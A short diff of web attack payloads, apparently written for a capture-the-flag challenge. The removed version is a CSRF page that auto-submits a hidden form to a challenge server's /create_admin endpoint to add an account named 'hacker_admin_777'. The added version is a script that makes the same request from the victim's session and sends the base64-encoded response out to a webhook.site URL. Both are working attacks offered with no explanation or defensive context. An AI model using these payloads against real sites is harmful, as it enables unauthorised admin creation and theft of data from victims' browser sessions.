@@ -1,13 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<body>
-    <form action="http://tasks.goidactf.ru:20160/create_admin" method="POST" id="csrf_form">
-        <input type="hidden" name="new_admin_login" value="hacker_admin_777">
-    </form>
-
-    <script>
-        // Автоматически отправляем форму сразу после загрузки
-        document.getElementById('csrf_form').submit();
-    </script>
-</body>
-</html>
+<script>
+  fetch('/create_admin', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'new_admin_login=hacker_admin_777'
+  })
+  .then(response => response.text())
+  .then(text => {
+    fetch('https://webhook.site/881be5bd-2065-4d10-b78f-89fb17e768f8?flag=' + btoa(text), {
+        mode: 'no-cors'
+    });
+  });
+</script>
